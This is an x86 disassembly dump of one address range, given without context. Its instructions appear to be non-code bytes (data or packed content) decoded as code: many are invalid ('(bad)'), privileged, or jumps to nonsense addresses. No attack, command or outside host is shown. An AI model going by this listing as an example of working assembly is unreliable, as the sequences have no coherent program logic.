  405099:	fisttp QWORD PTR [edi-0x1e896895]
  40509f:	inc    esi
  4050a0:	mov    eax,ds:0xae2b5598
  4050a5:	adc    BYTE PTR [edx+0x7376a261],ch
  4050ab:	scas   al,BYTE PTR es:[di]
  4050ad:	inc    eax
  4050ae:	pop    eax
  4050af:	xchg   ebp,eax
  4050b0:	fist   WORD PTR [ebx-0x285e5e42]
  4050b6:	push   cs
  4050b7:	dec    edi
  4050b8:	mov    al,ds:0x7969a84f
  4050bd:	jl     0x40511a
  4050bf:	stos   BYTE PTR es:[edi],al
  4050c0:	mov    edx,0xee554d5
  4050c5:	and    bh,BYTE PTR [ebp+0x5064f394]
  4050cb:	addr16 mov ebp,0x47a875ce
  4050d1:	ja     0x4050ae
  4050d3:	imul   esp,DWORD PTR ds:0x9c4f919e,0xfffffff5
  4050da:	scas   eax,DWORD PTR es:[edi]
  4050db:	pushf  
  4050dc:	(bad)  
  4050dd:	ror    DWORD PTR [ebx+0x6cfdfcdf],cl
  4050e3:	pusha  
  4050e4:	cmp    dl,BYTE PTR [esi-0x3d]
  4050e7:	sbb    ebp,edi
  4050e9:	cmp    eax,0x26b471b9
  4050ee:	shl    bh,1
  4050f0:	test   eax,0xc0381c19
  4050f5:	lds    esp,FWORD PTR [ebx+eax*1+0x1f2f2f4f]
  4050fc:	cs add eax,0x8282fd01
  405102:	pop    ds
  405103:	push   0x7ba34b30
  405108:	popf   
  405109:	pushf  
  40510a:	lds    esi,FWORD PTR [esi+0x2f]
  40510d:	push   es
  40510e:	retf   0xc4a9
  405111:	dec    edx
  405112:	repnz inc ebx
  405114:	mov    dh,0xf3
  405116:	xlat   BYTE PTR ds:[ebx]
  405117:	push   edx
  405118:	mov    ebp,0x4e706d9d
  40511d:	cli    
  40511e:	dec    edx
  40511f:	and    esp,DWORD PTR [edi+0xe925504]
  405125:	pop    ecx
  405126:	ins    BYTE PTR es:[edi],dx
  405127:	jecxz  0x405165
  405129:	jne    0x40511c
  40512b:	xchg   edi,eax
  40512c:	std    
  40512d:	jp     0x405183
  40512f:	pop    es
  405130:	cmp    BYTE PTR [eax],dl
  405132:	cld    
  405133:	ja     0x405163
  405135:	stos   BYTE PTR es:[edi],al
  405136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405137:	js     0x4051b2
  405139:	xor    edx,DWORD PTR [ebp-0x60]
  40513c:	inc    ecx
  40513d:	addr16 aad 0x95
  405140:	jecxz  0x4050f6
  405142:	je     0x405101
  405144:	lock or esi,DWORD PTR [esi]
  405147:	pop    edi
  405148:	cwde   
  405149:	inc    eax
  40514a:	mov    fs,WORD PTR [eax+eax*1+0x263241]
  405151:	mov    ds:0x100422ca,eax
  405156:	call   edx
  405158:	jbe    0x40517d
  40515a:	mov    edi,0xc283d985
  40515f:	sbb    al,0x1c
  405161:	inc    edx
  405162:	ret    0x97c0
  405165:	stc    
  405166:	repnz mov edx,0xe2668aa2
  40516c:	jo     0x40513e
  40516e:	and    eax,0xf313da45
  405173:	pop    es
  405174:	xor    dh,dl
  405176:	jl     0x4051c8
  405178:	(bad)  
  405179:	cmp    ch,BYTE PTR [esp+eax*1]
  40517c:	adc    DWORD PTR [esi-0x40],ecx
  40517f:	stc    
  405180:	fimul  DWORD PTR [eax]
  405182:	ja     0x405141
  405184:	pop    esi
  405185:	loopne 0x40519d
  405187:	shl    DWORD PTR [edi],cl
  405189:	pop    esi
  40518a:	inc    eax
  40518b:	sbb    DWORD PTR [edx+0x6e],eax
  40518e:	jbe    0x40515e
  405190:	add    DWORD PTR [esi+0x1842943d],eax
  405196:	(bad)  
  405197:	xchg   ebp,eax
  405198:	push   ecx
  405199:	jle    0x405198
  40519b:	sbb    al,0xa
  40519d:	pop    ebp
  40519e:	stc    
  40519f:	in     al,0x69
  4051a1:	sbb    eax,0xf7ab04a0
  4051a6:	inc    edx
  4051a7:	mov    esp,0x13876eec
  4051ac:	pop    edx
  4051ad:	jmp    0x88fb:0xa0966a70
  4051b4:	adc    DWORD PTR [ecx],0xffffffc9
  4051b7:	push   esp
  4051b8:	js     0x4051ea
  4051ba:	inc    eax
  4051bb:	retf   
  4051bc:	cmp    BYTE PTR [eax+0x6f],al
  4051bf:	jnp    0x4051fa
  4051c1:	push   edx
  4051c2:	inc    ebp
  4051c3:	push   edi
  4051c4:	(bad)  
  4051c5:	fidivr WORD PTR [esi-0x4f0f7011]
  4051cb:	nop
  4051cc:	or     esp,DWORD PTR [edx-0x4a726d78]
  4051d2:	inc    esi
  4051d3:	cld    
  4051d4:	dec    edx
  4051d5:	jnp    0x40517f
  4051d7:	mov    ?,WORD PTR [ebp-0x6a94fac6]
  4051dd:	fisubr DWORD PTR [edi]
  4051df:	pop    edx
  4051e0:	jge    0x405251
  4051e2:	cmp    DWORD PTR [eax-0x5b7ead3],ebx
  4051e8:	ds xchg ecx,eax
  4051ea:	push   ds
  4051eb:	jae    0x4051e1
  4051ed:	mov    esp,0xcf4e90d1
  4051f2:	mov    cl,0x43
  4051f4:	pop    esi
  4051f5:	jne    0x405216
  4051f7:	jl     0x4051fa
  4051f9:	mov    ds:0xc49c12d,eax
  4051fe:	mov    eax,ds:0xc7c80e59
  405203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405204:	(bad)  
  405206:	shr    DWORD PTR [edi],0x2b
  405209:	imul   edi,DWORD PTR [ebp+0x7912d001],0x5768631a
  405213:	jno    0x4051f9
  405215:	repnz add eax,0xebbec3e4
  40521b:	mov    dl,0xeb
  40521d:	adc    BYTE PTR ds:0xf5f59701,ch
  405223:	sbb    esp,edx
  405225:	xchg   ch,bl
  405227:	jge    0x4051c0
  405229:	inc    edi
  40522a:	dec    esi
  40522b:	ja     0x4051ec
  40522d:	(bad)  
  40522f:	fwait
  405230:	and    al,0x87
  405232:	shl    DWORD PTR ds:[ecx+esi*8-0x6b],cl
  405237:	fxch   st(7)
  405239:	sub    eax,0x60c09148
  40523e:	and    edi,DWORD PTR [eax-0x32]
  405241:	cli    
  405242:	mov    dl,0xbc
  405244:	xchg   ebp,eax
  405245:	cmp    ch,bl
  405247:	mov    bl,0xa4
  405249:	push   eax
  40524a:	jmp    0xa41df026
  40524f:	cmp    al,0x93
  405251:	pop    eax
  405252:	fs test eax,0xfdc9235a
  405258:	xor    eax,0x9ae5da10
  40525d:	hlt    
  40525e:	jl     0x40525b
  405260:	fdiv   QWORD PTR [ebx]
  405262:	inc    ebx
  405263:	repnz sub DWORD PTR [ecx+0x28],ecx
  405267:	scas   al,BYTE PTR es:[edi]
  405268:	repz and edi,DWORD PTR [ecx+0x2fd8b21]
  40526f:	fstp   QWORD PTR [edx+0x14]
  405272:	adc    eax,0xa7fee086
  405277:	xchg   edi,eax
  405278:	mov    dl,0x24
  40527a:	jge    0x405214
  40527c:	aad    0xe
  40527e:	leave  
  40527f:	loop   0x405272
  405281:	sbb    eax,0xc22e6ae2
  405286:	lahf   
  405287:	das    
  405288:	pop    eax
  405289:	aaa    
  40528a:	aam    0x3f
  40528c:	and    esp,esp
  40528e:	or     ebp,ebx
  405290:	sbb    al,0x19
  405292:	inc    ecx
  405293:	cwde   
  405294:	out    dx,eax
  405295:	into   
  405296:	in     eax,dx
  405297:	call   0xd0809321
  40529c:	daa    
  40529d:	mov    esp,0x52baa15d
  4052a2:	xor    eax,0x9850229c
  4052a7:	sbb    DWORD PTR [edi-0x5d],esi
  4052aa:	js     0x405322
  4052ac:	jl     0x40526e
  4052ae:	mov    ebx,0x59e88847
  4052b3:	outs   dx,DWORD PTR ds:[esi]
  4052b4:	arpl   WORD PTR [edx+0x34],si
  4052b7:	les    ebp,FWORD PTR [edi+0x68]
  4052ba:	inc    eax
  4052bb:	adc    al,0x55
  4052bd:	jl     0x405250
  4052bf:	or     eax,0x1d35472c
  4052c4:	cwde   
  4052c5:	pop    ecx
  4052c6:	inc    esi
  4052c7:	cwde   
  4052c8:	popa   
  4052c9:	into   
  4052ca:	sub    ebp,DWORD PTR [esi]
  4052cc:	sub    BYTE PTR [eax+0x7],bh
  4052cf:	arpl   WORD PTR [edi],bp
  4052d1:	xchg   edi,eax
  4052d2:	cmp    dh,ch
  4052d4:	fcom   QWORD PTR [edi*1-0xd13bf4a]
  4052db:	mov    ecx,fs
  4052dd:	in     eax,dx
  4052de:	ret    
  4052df:	clc    
  4052e0:	retf   
  4052e1:	cmp    bh,BYTE PTR [ecx-0x1a]
  4052e4:	push   edx
  4052e5:	iret   
  4052e6:	pop    ds
  4052e7:	cdq    
  4052e8:	data16 aas 
  4052ea:	call   0xe2bc006f
  4052ef:	popf   
  4052f0:	dec    ebx
  4052f1:	in     eax,dx
  4052f2:	xor    BYTE PTR [edi-0x74d1851],al
  4052f8:	pop    edi
  4052fa:	sbb    esi,ebp
  4052fc:	and    al,0x14
  4052fe:	gs jmp 0x405336
  405301:	jmp    0x405359
  405303:	xchg   ebp,eax
  405304:	mov    bh,0xf7
  405306:	push   ss
  405307:	lods   eax,DWORD PTR ds:[esi]
  405308:	jns    0x4052d5
  40530a:	xchg   esp,eax
  40530b:	or     DWORD PTR [ecx+0x1a],eax
  40530e:	add    ah,BYTE PTR [ecx+0x0]
  405311:	retf   0x2263
  405314:	sub    dl,BYTE PTR [edx]
  405316:	ins    DWORD PTR es:[edi],dx
  405317:	add    edi,DWORD PTR [eax+0x1a]
  40531a:	nop
  40531b:	stc    
  40531c:	adc    dl,BYTE PTR [ebx]
  40531e:	and    ebx,DWORD PTR [ebx+0x4c]
  405321:	fnstcw WORD PTR [edi-0x50]
  405324:	ds mov edx,0x6be26e6a
  40532a:	pop    edi
  40532b:	nop
  40532c:	pop    edx
  40532d:	xchg   DWORD PTR [eax+0x3d5f8227],eax
  405333:	repz ret 0x42b8
  405337:	adc    dl,BYTE PTR [edx+eax*8-0x3f]
  40533b:	sbb    cl,cl
  40533d:	les    ebx,FWORD PTR [edi-0x11]
  405340:	je     0x405333
  405342:	out    0x67,eax
  405344:	xor    ebp,DWORD PTR [edx+0x3ab9d401]
  40534a:	mov    dh,0x47
  40534c:	ins    BYTE PTR es:[edi],dx
  40534d:	inc    edx
  40534e:	loope  0x40537d
  405350:	mov    DWORD PTR [edi],0xaa988b3d
  405356:	sub    al,0xf5
  405359:	ins    DWORD PTR es:[edi],dx
  40535a:	test   eax,0x7b87809d
  40535f:	jg     0x4052f6
  405361:	iret   
  405362:	sub    DWORD PTR [ecx],0x3e
  405365:	push   eax
  405366:	xlat   BYTE PTR ds:[ebx]
  405367:	call   0xcf5204f0
  40536c:	mov    esp,0x9ee0441c
  405371:	iret   
  405372:	icebp  
  405373:	sbb    DWORD PTR [eax+0x7a05e71],0x3e756571
  40537d:	mov    esp,0xcffad5cd
  405382:	enter  0x908b,0x44
  405386:	jmp    0x25ed8456
  40538b:	add    cl,BYTE PTR [edi+0x79e7a271]
  405391:	sub    BYTE PTR [ebx-0x567d7197],ch
  405397:	out    dx,eax
  405398:	xor    BYTE PTR [ecx],al
  40539a:	ret    
  40539b:	test   ah,bl
  40539d:	mov    esp,0xc997deaf
  4053a2:	add    BYTE PTR [edi-0x754d96f3],dl
  4053a8:	cmp    DWORD PTR [esi+0x3],ecx
  4053ab:	xchg   esp,eax
  4053ac:	scas   al,BYTE PTR es:[edi]
  4053ad:	xchg   ebx,eax
  4053ae:	jb     0x4053be
  4053b0:	imul   al
  4053b2:	push   ebp
  4053b3:	jmp    0x40533a
  4053b5:	adc    eax,0xdec4902f
  4053ba:	out    dx,eax
  4053bb:	(bad)  
  4053bc:	pop    edx
  4053bd:	lock adc ecx,DWORD PTR [ecx+0x39]
  4053c1:	adc    eax,0x39905437
  4053c6:	and    eax,DWORD PTR [ebp+0x736be68]
  4053cc:	mov    eax,0x5348d8e9
  4053d1:	xchg   edi,eax
  4053d2:	inc    ebp
  4053d3:	and    edi,edi
  4053d5:	and    esi,eax
  4053d7:	jb     0x4053e3
  4053d9:	pop    ebp
  4053da:	dec    esi
  4053db:	push   ss
  4053dc:	loop   0x4053c8
  4053de:	imul   esi,DWORD PTR [ebp+0x2d],0x16ee511e
  4053e5:	cdq    
  4053e6:	fcomp  QWORD PTR ds:[ebx+0x364b7750]
  4053ed:	adc    eax,esi
  4053ef:	xor    al,0xec
  4053f1:	hlt    
  4053f2:	mov    dl,0xcf
  4053f4:	(bad)
  4053f7:	pop    edx
  4053f8:	mov    edx,0x285d8c94
  4053fd:	mov    ?,WORD PTR [ecx+edi*1]
  405400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405401:	xor    BYTE PTR [ecx+0x230545e7],0x45
  405408:	(bad)  
  405409:	out    0x39,al
  40540b:	cmp    ch,BYTE PTR [esi-0x78]
  40540e:	out    0x2c,al
  405410:	clc    
  405411:	inc    ecx
  405412:	dec    edi
  405413:	sub    BYTE PTR [edi],bl
  405415:	mov    eax,ds:0x1af9a08f
  40541a:	test   eax,0x93cf46f4
  40541f:	pop    es
  405420:	sbb    DWORD PTR [edx],0x34bd8dde
  405426:	pop    ds
  405427:	lds    ebx,FWORD PTR [ecx+0x60]
  40542a:	jo     0x405452
  40542c:	xchg   DWORD PTR [edx],ebx
  40542e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40542f:	fbld   TBYTE PTR [ecx]
  405431:	enter  0xa65a,0x12
  405435:	stos   BYTE PTR es:[edi],al
  405436:	clc    
  405437:	pop    ecx
  405438:	dec    eax
  405439:	dec    esp
  40543a:	mov    esi,0xaface5da
  40543f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405440:	inc    esp
  405441:	dec    esi
  405442:	or     edi,DWORD PTR [ebx+0x1f8ec53f]
  405448:	push   edx
  405449:	mov    bl,0x4e
  40544b:	xor    eax,0xa060ff7f
  405450:	(bad)  
  405451:	popf   
  405452:	es inc ebp
  405454:	shl    BYTE PTR [ebx+0x4922f2d7],cl
  40545a:	aas    
  40545b:	cmp    BYTE PTR [esi+0x14a50cc0],dh
  405461:	fiadd  WORD PTR [edx+0x23]
  405464:	and    BYTE PTR [eax],ch
  405466:	jae    0x4053ee
  405468:	(bad)  
  405469:	call   0x978:0x603a2541
  405470:	cld    
  405471:	dec    esi
  405472:	add    edx,DWORD PTR [ebp-0x5fee88b3]
  405478:	sahf   
  405479:	sub    DWORD PTR [edx-0x54],0x1cde741a
  405480:	out    0xae,eax
  405482:	and    eax,0xaa3d37c5
  405487:	mov    ecx,0xc04908a5
  40548c:	mul    DWORD PTR [esi+0x22]
  40548f:	mov    ch,0x3c
  405491:	add    al,0xa9
  405493:	cmp    dl,BYTE PTR [eax+0x79]
  405496:	mov    dl,0xd8
  405498:	ins    BYTE PTR es:[edi],dx
  405499:	xor    BYTE PTR [edx-0x6bc5fff4],bh
  40549f:	xchg   esi,eax
  4054a0:	ins    DWORD PTR es:[edi],dx
  4054a1:	mov    bh,0x61
  4054a3:	cwde   
  4054a4:	retf   0xa835
  4054a7:	arpl   WORD PTR [ecx+0x4f],cx
  4054aa:	fcmovnu st,st(1)
  4054ac:	pop    ebp
  4054ad:	(bad)  [ebp+ecx*2+0x48]
  4054b2:	xor    al,0xe3
  4054b4:	rcr    DWORD PTR [edi-0xc],cl
  4054b7:	pop    esp
  4054b8:	js     0x40551a
  4054ba:	push   ss
  4054bb:	test   BYTE PTR [eax+eiz*1],cl
  4054be:	jl     0x4054cf
  4054c0:	push   eax
  4054c1:	jb     0x405444
  4054c3:	fistp  DWORD PTR [ebp-0x16]
  4054c6:	(bad)  
  4054c7:	and    bh,BYTE PTR [edx+0x5b44e7b4]
  4054cd:	inc    edx
  4054ce:	mov    edi,DWORD PTR [ebp+0x5e]
  4054d1:	call   0x1c43:0x1a84f7a7
  4054d8:	cmc    
  4054d9:	arpl   WORD PTR [ebx-0x7e0fe849],bp
  4054df:	jmp    0x405499
  4054e1:	jns    0x405466
  4054e3:	xor    DWORD PTR [ebp-0xc],edi
  4054e6:	pop    ds
  4054e7:	mov    esp,0xcd972f45
  4054ec:	pop    ebp
  4054ed:	sbb    eax,0xdf7d50a7
  4054f2:	fs inc esi
  4054f4:	into   
  4054f5:	sub    esp,ecx
  4054f7:	rcr    DWORD PTR [esi-0x21],0x12
  4054fb:	lea    ecx,[ecx+esi*8-0x7846bfc8]
  405502:	add    cl,BYTE PTR [ebx+0x26]
  405505:	test   WORD PTR [ecx+ebx*8+0x1291dff3],dx
  40550d:	sub    DWORD PTR [edx],eax
  40550f:	pop    eax
  405510:	adc    esp,DWORD PTR [edx-0x6f]
  405513:	mov    dh,BYTE PTR [ecx]
  405515:	mov    al,ds:0x54f54073
  40551a:	xchg   ebx,eax
  40551b:	mov    ch,0xd9
  40551d:	dec    esp
  40551e:	dec    BYTE PTR [edi]
  405520:	popa   
  405521:	jmp    0x405590
  405523:	sbb    DWORD PTR [ebx+ecx*1],edx
  405526:	and    eax,edi
  405528:	jno    0x4054b6
  40552a:	xchg   edx,eax
  40552b:	and    dh,dl
  40552d:	retf   0xfdc1
  405530:	adc    cl,bl
  405532:	mov    esp,0x397aab2e
  405537:	pop    ebp
  405538:	xchg   esp,eax
  405539:	sub    eax,0x7771f73c
  40553e:	jmp    0x5b760409
  405543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405544:	dec    edi
  405545:	fld    QWORD PTR [ebp-0x6c67b332]
  40554b:	dec    edi
  40554c:	push   ebx
  40554d:	xchg   esi,eax
  40554e:	fnstcw WORD PTR [edx]
  405550:	ja     0x4055b7
  405552:	xor    eax,0xc0ffa5df
  405557:	aas    
  405558:	arpl   bp,bx
  40555a:	sub    ah,BYTE PTR [eax]
  40555c:	test   DWORD PTR ds:0x99852e80,edi
  405562:	cwde   
  405563:	pop    edx
  405564:	mov    ecx,0xab84f35b
  405569:	fidivr WORD PTR [eax]
  40556b:	fsub   QWORD PTR [edi+0x2b]
  40556e:	data16 std 
  405570:	inc    eax
  405571:	stos   BYTE PTR es:[edi],al
  405572:	stos   BYTE PTR es:[edi],al
  405573:	mov    dl,0x99
  405575:	es jge 0x4055ca
  405578:	shl    DWORD PTR [ecx-0x2f],cl
  40557b:	imul   BYTE PTR [edi+edx*2-0x39]
  40557f:	in     eax,dx
  405580:	aas    
  405581:	pop    edi
  405582:	mov    ah,0x20
  405584:	pop    ss
  405585:	xor    eax,0x9f31ca12
  40558a:	sbb    esi,edi
  40558c:	xchg   DWORD PTR [esi+edx*1+0x1d56d460],edi
  405593:	cmp    BYTE PTR [ebx-0x1b],dl
  405596:	fisubr WORD PTR [edx+0x9aa34a0]
  40559c:	push   edx
  40559d:	fisubr DWORD PTR [ecx+0x2f]
  4055a0:	jmp    0x40552a
  4055a2:	call   0x2b2734d6
  4055a7:	dec    edx
  4055a8:	push   cs
  4055a9:	dec    ebx
  4055aa:	add    DWORD PTR [esi+0x41c687c2],ecx
  4055b0:	(bad)  
  4055b1:	js     0x4055d9
  4055b3:	or     al,0x62
  4055b5:	sub    al,0x2e
  4055b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055b8:	push   ebx
  4055b9:	dec    ecx
  4055ba:	inc    ecx
  4055bb:	in     al,dx
  4055bc:	scas   al,BYTE PTR es:[edi]
  4055bd:	les    esi,FWORD PTR [esi+eiz*8+0x47]
  4055c1:	popa   
  4055c2:	dec    edi
  4055c3:	push   edx
  4055c4:	loop   0x40554f
  4055c6:	sbb    dl,BYTE PTR [edx+eiz*1+0x1e94dbaf]
  4055cd:	or     bl,bh
  4055cf:	mov    ch,0x8f
  4055d1:	ds stc 
  4055d3:	mov    DWORD PTR [ebx+eiz*8-0x59],ebx
  4055d7:	add    al,0xe7
  4055d9:	push   0xe2c905bc
  4055de:	xor    bh,dh
  4055e0:	es or  ebx,eax
  4055e3:	cld    
  4055e4:	add    dl,BYTE PTR [eax]
  4055e6:	add    BYTE PTR [bp+si+0x29],al
  4055ea:	push   ss
  4055eb:	jmp    0x933fcde8
  4055f0:	int    0xd9
  4055f2:	mov    ebx,0x33c1a981
  4055f7:	cmc    
  4055f8:	add    eax,0x728255b9
  4055fd:	hlt    
  4055fe:	jb     0x405674
  405600:	cmp    eax,0x64e7eb24
  405605:	adc    BYTE PTR [eax],0x4
  405608:	shl    DWORD PTR [ecx-0x6e],cl
  40560b:	inc    edx
  40560c:	mov    dh,0x10
  40560e:	push   ebx
  40560f:	retf   
  405610:	dec    edi
  405611:	adc    eax,0x92cfdfd3
  405616:	and    BYTE PTR [ecx+0x2de10ad1],dh
  40561c:	retf   0x3c6e
  40561f:	sbb    eax,0xb685147b
  405624:	xchg   edx,eax
  405625:	pop    ss
  405626:	xchg   ebp,eax
  405627:	fcomp  QWORD PTR [edx+0x27c196d4]
  40562d:	lods   eax,DWORD PTR ds:[esi]
  40562e:	outs   dx,DWORD PTR ds:[esi]
  40562f:	(bad)  
  405630:	jno    0x40566c
  405632:	ins    DWORD PTR es:[edi],dx
  405633:	add    esi,DWORD PTR [ebx]
  405635:	cmp    cl,bl
  405637:	adc    edx,esi
  405639:	jge    0x4056aa
  40563b:	inc    ebp
  40563c:	mov    ecx,0xb91bae4d
  405641:	cmc    
  405642:	xor    DWORD PTR [edx+0x15],edi
  405645:	stos   DWORD PTR es:[edi],eax
  405646:	inc    ebx
  405647:	push   ebx
  405648:	mov    edx,0x463b7e50
  40564d:	aaa    
  40564e:	shl    BYTE PTR [ebx+0x249ba6d4],0xa3
  405655:	mov    ds:0x51b8f063,eax
  40565a:	and    ebp,eax
  40565c:	and    eax,0xbb829adb
  405661:	pop    esp
  405662:	jae    0x405656
  405664:	pop    ebp
  405665:	ins    BYTE PTR es:[edi],dx
  405666:	inc    edi
  405667:	cmp    ch,ah
  405669:	addr16 or cl,dh
  40566c:	mul    al
  40566e:	loopne 0x4056e1
  405670:	jnp    0x405680
  405672:	and    al,0x3e
  405674:	mov    ss,ebx
  405676:	mov    eax,0xeb6bfd14
  40567b:	retf   0x31d
  40567e:	push   ebp
  40567f:	push   0xffffff9b
  405681:	jbe    0x405607
  405683:	mov    bh,0x9d
  405685:	out    0x9d,eax
  405687:	mov    esp,0x567ac289
  40568c:	pop    ebx
  40568d:	cli    
  40568e:	push   ss
  40568f:	scas   al,BYTE PTR es:[edi]
  405690:	call   0x8951:0x177a0f45
  405697:	xor    eax,DWORD PTR [ebx+0x54820310]
  40569d:	inc    eax
  40569e:	mov    ebx,edi
  4056a0:	pop    ebp
  4056a1:	cwde   
  4056a2:	ror    BYTE PTR [ebx+0x79],0x62
  4056a6:	mov    bl,0xbd
  4056a8:	sub    esp,edi
  4056aa:	psllq  mm6,mm0
  4056ad:	das    
  4056ae:	inc    edi
  4056af:	int    0xf9
  4056b1:	push   ds
  4056b2:	jg     0x4056f6
  4056b4:	shl    BYTE PTR [ebx],1
  4056b6:	sub    edx,DWORD PTR [ebx+0x4f76d847]
  4056bc:	push   0xffffff9e
  4056be:	lods   eax,DWORD PTR ds:[esi]
  4056bf:	(bad)  
  4056c1:	and    bl,BYTE PTR [ebx]
  4056c3:	into   
  4056c4:	cmp    BYTE PTR [eax],dh
  4056c6:	cdq    
  4056c7:	push   ebx
  4056c8:	ins    DWORD PTR es:[edi],dx
  4056c9:	and    eax,0x43fbcd
  4056ce:	(bad)  
  4056cf:	xor    dh,ch
  4056d1:	xchg   esi,eax
  4056d2:	pop    ebp
  4056d3:	dec    esi
  4056d4:	xor    al,0x9b
  4056d6:	push   ecx
  4056d7:	adc    al,0xc4
  4056d9:	push   cs
  4056da:	dec    ebp
  4056db:	jecxz  0x405687
  4056dd:	push   es
  4056de:	pop    ss
  4056df:	imul   ebx,ecx,0x13feb005
  4056e5:	cwde   
  4056e6:	and    BYTE PTR ds:0x3c5fbf65,bh
  4056ec:	jmp    0x2032:0x9d592f6e
  4056f3:	jl     0x4056b9
  4056f5:	imul   edx,DWORD PTR [ecx],0xffffffa1
  4056f8:	lods   eax,DWORD PTR ds:[esi]
  4056f9:	aaa    
  4056fa:	loop   0x405728
  4056fc:	cmc    
  4056fd:	mov    ah,0xb2
  4056ff:	std    
  405700:	mov    WORD PTR [edx-0x37],fs
  405703:	out    0x6b,eax
  405705:	xchg   edx,eax
  405706:	icebp  
  405707:	jnp    0x40569e
  405709:	sbb    bl,BYTE PTR [eax+0x74]
  40570c:	cmp    esp,0xa9013155
  405712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405713:	lock test dh,0xa4
  405717:	pop    ebp
  405718:	sbb    eax,0x3fbeb6de
  40571d:	jmp    0x4056ab
  40571f:	mov    eax,ds:0x533671d7
  405724:	jge    0x40578c
  405726:	sbb    edx,DWORD PTR [ebx-0x72b35dca]
  40572c:	bound  edx,QWORD PTR [eax]
  40572e:	pop    edi
  40572f:	add    BYTE PTR [edi+0x12461653],cl
  405735:	and    dl,bh
  405737:	nop
  405738:	enter  0xac13,0xfe
  40573c:	mov    ds:0x718e89d2,al
  405741:	jne    0x4057a9
  405743:	and    al,0x40
  405745:	out    0x96,eax
  405747:	inc    ecx
  405748:	xor    eax,0x4c3ebad4
  40574d:	sbb    bl,BYTE PTR [edi+0x4c]
  405750:	mov    ecx,0xbcaf60e
  405755:	loop   0x4056d7
  405757:	jmp    0x27bf8a19
  40575c:	cld    
  40575d:	mov    esi,0x19224da6
  405762:	jmp    0xe8c01634
  405767:	ret    
  405768:	mov    ah,0x56
  40576a:	and    DWORD PTR [esi+ecx*8+0x64d52acc],0xfe963632
  405775:	xlat   BYTE PTR ds:[ebx]
  405776:	std    
  405777:	mov    cl,dh
  405779:	pop    ebp
  40577a:	add    al,0x82
  40577c:	adc    ebx,esp
  40577e:	lock into 
  405780:	lods   al,BYTE PTR ds:[esi]
  405781:	stos   DWORD PTR es:[edi],eax
  405782:	inc    ecx
  405783:	retf   
  405784:	repz jbe 0x405783
  405787:	rcl    DWORD PTR [edi],1
  405789:	pop    es
  40578a:	enter  0x5414,0xef
  40578e:	dec    esi
  40578f:	xor    bh,BYTE PTR [edi]
  405791:	(bad)  
  405792:	jl     0x4057ee
  405794:	xor    al,0x48
  405796:	in     al,dx
  405797:	dec    esp
  405798:	cmp    eax,DWORD PTR [ebp-0x1e651a54]
  40579e:	xor    dh,al
  4057a0:	stc    
  4057a1:	add    BYTE PTR [edx+edi*2+0x330d85ac],dh
  4057a8:	cmp    al,0xfd
  4057aa:	fwait
  4057ab:	shl    DWORD PTR [esi],1
  4057ad:	pop    edx
  4057ae:	jmp    0x405e:0xdfa40cc0
  4057b5:	fcmovne st,st(7)
  4057b7:	jb     0x405754
  4057b9:	push   es
  4057ba:	sub    esi,esi
  4057bc:	leave  
  4057bd:	inc    edi
  4057be:	repz test eax,0x515b2a98
  4057c4:	scas   al,BYTE PTR es:[edi]
  4057c5:	jmp    0xbbf0:0xdb6dffc4
  4057cc:	in     al,0x52
  4057ce:	into   
  4057cf:	mov    esp,0xbd03084b
  4057d4:	in     al,dx
  4057d5:	outs   dx,DWORD PTR ds:[esi]
  4057d6:	out    0x12,al
  4057d8:	shr    DWORD PTR [ebx+0x850cb28],0x31
  4057df:	mov    eax,ds:0x76429f97
  4057e4:	pop    edx
  4057e5:	aad    0xe2
  4057e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e8:	mov    ?,WORD PTR [ebx-0x58]
  4057eb:	jp     0x4057e1
  4057ed:	sbb    eax,DWORD PTR [esi]
  4057ef:	and    eax,0x7da00889
  4057f4:	xchg   esp,eax
  4057f5:	(bad)  
  4057f6:	shr    DWORD PTR [ecx],cl
  4057f8:	test   cl,dl
  4057fa:	pop    ebp
  4057fb:	sbb    bh,BYTE PTR [ebx+eiz*2-0x4e90b0e9]
  405802:	xor    BYTE PTR [ebx-0x409714d8],al
  405808:	cmp    al,0x4
  40580a:	hlt    
  40580b:	cmp    eax,0x476a571c
  405810:	enter  0x175,0x4c
  405814:	adc    al,0x2b
  405816:	xchg   ecx,eax
  405817:	jae    0x4057df
  405819:	lds    edi,FWORD PTR [esp+eax*1]
  40581c:	outs   dx,DWORD PTR ds:[esi]
  40581d:	out    dx,al
  40581e:	xchg   edx,eax
  40581f:	or     ch,BYTE PTR [ecx-0x58043113]
  405825:	shl    BYTE PTR [ebx],1
  405827:	repnz or eax,0xb37d9a1c
  40582d:	shl    DWORD PTR [ebp+0x5e],cl
  405830:	push   ecx
  405831:	dec    ecx
  405832:	clc    
  405833:	out    dx,al
  405834:	or     DWORD PTR [edi],ebp
  405836:	imul   edx,ebx,0xffffffc7
  405839:	leave  
  40583a:	dec    eax
  40583b:	mov    al,ds:0xb03cb20c
  405840:	dec    ecx
  405841:	fs cmp al,0xe7
  405844:	cwde   
  405845:	clc    
  405846:	inc    edi
  405847:	(bad)  
  405849:	jae    0x4058aa
  40584b:	dec    ecx
  40584c:	je     0x4057e3
  40584e:	xchg   esi,eax
  40584f:	ja     0x40583e
  405851:	jg     0x4058b1
  405853:	sbb    ecx,esp
  405855:	sub    ch,BYTE PTR [ebp+ecx*4-0x7e]
  405859:	or     ebp,ebp
  40585b:	sbb    al,0x32
  40585d:	test   DWORD PTR [edx+ecx*2],edi
  405860:	shr    bh,1
  405862:	mov    al,0x7f
  405864:	cmovle eax,ebp
  405867:	push   edi
  405868:	cmp    ecx,edx
  40586a:	cmp    DWORD PTR ds:0xfb88e515,esp
  405870:	xlat   BYTE PTR ds:[ebx]
  405871:	cwde   
  405872:	push   ss
  405873:	stc    
  405874:	hlt    
  405875:	push   cs
  405876:	pop    es
  405877:	sbb    bh,BYTE PTR [edi+0x3fb2998a]
  40587d:	dec    edi
  40587e:	or     al,0x8d
  405880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405881:	push   0x67
  405883:	pop    edi
  405885:	xor    DWORD PTR ds:0x2c474786,0xa115cd09
